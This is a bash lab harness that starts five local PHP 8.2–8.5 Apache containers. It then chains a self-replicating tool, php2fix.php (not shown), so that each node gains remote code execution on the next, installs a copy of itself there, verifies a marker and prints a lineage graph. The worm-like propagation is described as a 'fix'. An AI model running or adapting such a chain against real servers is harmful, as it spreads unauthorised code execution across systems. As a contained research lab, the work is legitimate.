#!/usr/bin/env bash
#
# php2fix chain -- a self-replicating fix that walks a stock PHP 8.2 -> 8.5 chain.
#
#   node 1 (php 8.2, "patient zero") is seeded with php2fix.php by hand; from
#   there every hop is the previous node fixing the next one over HTTP:
#
#       seed 8.2  ->  8.2  ->  8.3  ->  8.4  ->  8.5
#
# Each container is a stock official image (Debian trixie, php.ini-production,
# stock 150-worker mpm_prefork).  The only thing this script mounts is a writable
# docroot, because that is what "installing the fix" needs.
#
#   ./chain.sh            build + run the chain, print the lineage graph
#   ./chain.sh --keep     do not tear the containers down afterwards
#   ./chain.sh --rebuild   force re-create the containers
#   ./chain.sh --patch     let each fixed node patch itself so it can be the
#                          next attacker (memory_limit=-1; opt-in because it
#                          makes that node un-exploitable from then on)
#
# Image pulling: `podman pull` is attempted, but a local image is fine (this lab
# was built from local images, so pulling is optional).
#
# Podman note: in a rootless sandbox you may need your wrapper, e.g.
#   PODMAN=podman ./chain.sh          # or any wrapper that accepts the same args
#
set -euo pipefail

HERE=$(CDPATH='' cd -- "$(dirname -- "$0")" && pwd)
PODMAN=${PODMAN:-podman}
PROJECT=${PROJECT:-php2fix}
BASE_PORT=${BASE_PORT:-43101}
TOOL="$HERE/php2fix.php"
LAB=${LAB:-$HERE/.lab}
KEEP=0
REBUILD=0
PATCH=0
for a in "$@"; do
    case "$a" in
        --keep) KEEP=1 ;;
        --rebuild) REBUILD=1 ;;
        --patch) PATCH=1 ;;   # let each hop patch its target
        -h|--help) sed -n '2,30p' "$0"; exit 0 ;;
        *) echo "unknown argument: $a" >&2; exit 2 ;;
    esac
done

# name:php-version -- the chain, in order
NODES=(
    "a82:8.2.34"
    "b82:8.2.34"
    "c83:8.3.35"
    "d84:8.4.26"
    "e85:8.5.11"
)

say() { printf '%s\n' "$*"; }
die() { printf 'error: %s\n' "$*" >&2; exit 1; }

port_of() { echo $((BASE_PORT + $1)); }
name_of() { echo "${NODES[$1]%%:*}"; }
ver_of()  { echo "${NODES[$1]##*:}"; }

wait_http() {
    local port=$1 i
    for i in $(seq 1 40); do
        if curl -fsS -o /dev/null --max-time 3 "http://127.0.0.1:$port/" 2>/dev/null; then
            return 0
        fi
        sleep 1
    done
    return 1
}

ensure_image() {
    local img="php:$1-apache"
    "$PODMAN" image exists "$img" 2>/dev/null && return 0
    say "pulling $img ..."
    "$PODMAN" pull "$img" >/dev/null 2>&1 || say "  (pull failed; hoping it is local)"
    "$PODMAN" image exists "$img" 2>/dev/null || die "image $img is not available"
}

build_node() {
    local idx=$1 name ver port dir
    name=$(name_of "$idx")
    ver=$(ver_of "$idx")
    port=$(port_of "$idx")
    dir="$LAB/$name"
    ensure_image "$ver"
    mkdir -p "$dir"
    # start from a clean docroot every run: a leftover installed copy, marker or
    # .user.ini from a previous run makes the chain behave differently
    rm -f "$dir"/p2f-* "$dir"/.user.ini "$dir"/php2fix.php
    printf '<?php echo "OK\\n"; ?>\n' > "$dir/index.php"
    chmod 777 "$dir"
    chmod 666 "$dir/index.php" 2>/dev/null

    if [ "$REBUILD" = 1 ] || ! "$PODMAN" container exists "${PROJECT}-${name}" 2>/dev/null; then
        "$PODMAN" rm -f "${PROJECT}-${name}" >/dev/null 2>&1
        say "starting ${PROJECT}-${name}  (php $ver, :$port)"
        "$PODMAN" run -d --name "${PROJECT}-${name}" \
            --network slirp4netns:allow_host_loopback=true \
            --pull=never -p "127.0.0.1:$port:80" \
            -v "$dir:/var/www/html:rw" "php:$ver-apache" >/dev/null \
            || die "could not start ${PROJECT}-${name}"
    fi
    # stock ini: the official image ships php.ini-production but does not enable it
    "$PODMAN" exec "${PROJECT}-${name}" sh -c \
        'test -f /usr/local/etc/php/php.ini || cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini' \
        >/dev/null 2>&1
    "$PODMAN" restart "${PROJECT}-${name}" >/dev/null 2>&1
    wait_http "$port" || die "${PROJECT}-${name} did not serve on :$port"
}

seed_patient_zero() {
    local dir
    dir="$LAB/$(name_of 0)"
    cp "$TOOL" "$dir/php2fix.php"
    chmod 666 "$dir/php2fix.php"
    # the seeded copy runs the exploit from a web request, so it needs the same
    # per-directory ini patch the payload would install
    say "seeded patient zero: ${PROJECT}-$(name_of 0)"
    if [ "$PATCH" = 1 ]; then
        patch_node 0
    fi
}

# patch_node <index>: ask the copy on that node to raise its own limits
patch_node() {
    local idx=$1 name port out
    name=$(name_of "$idx"); port=$(port_of "$idx")
    out=$(curl -sS --max-time 30 "http://127.0.0.1:$port/php2fix.php?patch" 2>/dev/null) || true
    if [ -z "$out" ]; then
        say "   patch: no copy on ${name} to ask (skipped)"
        return 1
    fi
    say "   patch ${name}: $(printf '%s' "$out" | head -1)"
    return 0
}

# hop <src-index> <dst-index>: the src copy fixes the dst node, then we verify
hop() {
    local src=$1 dst=$2 sname dname sport dport dver
    sname=$(name_of "$src"); dname=$(name_of "$dst")
    sport=$(port_of "$src"); dport=$(port_of "$dst"); dver=$(ver_of "$dst")
    "$PODMAN" exec "${PROJECT}-${dname}" sh -c \
        'rm -f /var/www/html/p2f-* /var/www/html/.user.ini' >/dev/null 2>&1
    say ""
    say "== hop: ${PROJECT}-${sname} (php $(ver_of "$src")) -> ${PROJECT}-${dname} (php $dver, :$dport)"

    local body t0 logf
    t0=$(date +%s)
    # Stream the hop's log as it happens (one node's attempt can take ~40 s) and
    # keep the raw body for the verdict.  The tool flushes each line; without
    # this the hop looked dead until it finished.
    logf="$LAB/.hop.log"
    : > "$logf"
    curl -sS --max-time 240 -w '\n__HTTP=%{http_code}' -X POST \
        -d 'run=1' \
        -d 'host=10.0.2.2' \
        -d "port=$dport" \
        -d "version=$dver" \
        -d 'retries=6' \
        -d "callback=http://10.0.2.2:$sport/php2fix.php" \
        -d 'installPath=/var/www/html/php2fix.php' \
        -d 'setMemoryLimit=0' \
        "http://127.0.0.1:$sport/php2fix.php" 2>/dev/null \
        | tee "$logf" | sed -u -e 's/^/   | /' >&2 || true
    body=$(cat "$logf")

    say "   ($(( $(date +%s) - t0 ))s, $(printf '%s' "$body" | tail -1 | sed 's/__HTTP=//'))"
    local ok=1
    if printf '%s' "$body" | grep -q 'RCE OK'; then
        ok=0
    fi
    local marker
    marker=$(cat "$LAB/$dname/p2f-marker.txt" 2>/dev/null)
    if [ -n "$marker" ]; then
        say "   RCE OK"
        say "   marker: $marker"
        # Patching is opt-in (--patch): it is what makes a node able to run the
        # exploit for the next hop, but memory_limit=-1 also makes that node
        # permanently un-exploitable, so it must be an explicit choice.
        if [ "$PATCH" = 1 ]; then
            patch_node "$dst"
        fi
        return 0
    fi
    say "   FAILED (no marker)"
    printf '%s' "$body" | sed -n 's/.*\(why:[^<]*\).*/   \1/p' | tail -1
    return 1
}

show_graph() {
    say ""
    say "===================== lineage ====================="
    say "  ${PROJECT}-$(name_of 0)  (patient zero, seeded by hand)"
    local i name ver lines
    for i in "${!NODES[@]}"; do
        if [ "$i" = 0 ]; then continue; fi
        name=$(name_of "$i"); ver=$(ver_of "$i")
        local f="$LAB/$name/php2fix.php"
        lines=$(grep -c '^ \* I got fixed by ' "$f" 2>/dev/null || true)
        printf '  %s %-6s php %-7s  %s-line lineage\n' \
            "$([ "$lines" -gt 0 ] 2>/dev/null && echo '├─' || echo '└─')" \
            "${PROJECT}-${name}" "$ver" "${lines:-0}"
        if [ -f "$f" ]; then
            grep '^ \* I got fixed by ' "$f" 2>/dev/null | sed 's/^/       /' || true
        fi
    done
}

main() {
    command -v "$PODMAN" >/dev/null 2>&1 || die "podman not found (set PODMAN=...)"
    [ -f "$TOOL" ] || die "missing $TOOL"
    mkdir -p "$LAB"

    say "lab: $LAB   images: php:8.2.34 / 8.3.35 / 8.4.26 / 8.5.11 -apache (trixie)"
    local i
    say ""
    say "== phase 1: containers"
    for i in "${!NODES[@]}"; do build_node "$i"; done
    set +e
    say ""
    say "== phase 2: seeding patient zero"
    seed_patient_zero
    say ""
    say "== phase 3: chain"
    set +e

    # the chain: patient zero fixes the next 8.2, which fixes 8.3, then 8.4, 8.5
    for i in 0 1 2 3; do
        local n=1 ok=1
        while [ "$n" -le 3 ]; do
            if hop "$i" "$((i + 1))"; then ok=0; break; fi
            say "   retrying hop ($n/3)"
            n=$((n + 1))
        done
        if [ "$ok" != 0 ]; then
            say "   hop failed after 3 tries - stopping the chain here"
            break
        fi
    done
    set -e
    show_graph

    if [ "$KEEP" = 0 ]; then
        say ""
        say "tearing down (use --keep to keep the containers)"
        for i in "${!NODES[@]}"; do
            "$PODMAN" rm -f "${PROJECT}-$(name_of "$i")" >/dev/null 2>&1
        done
    fi
}

main "$@"
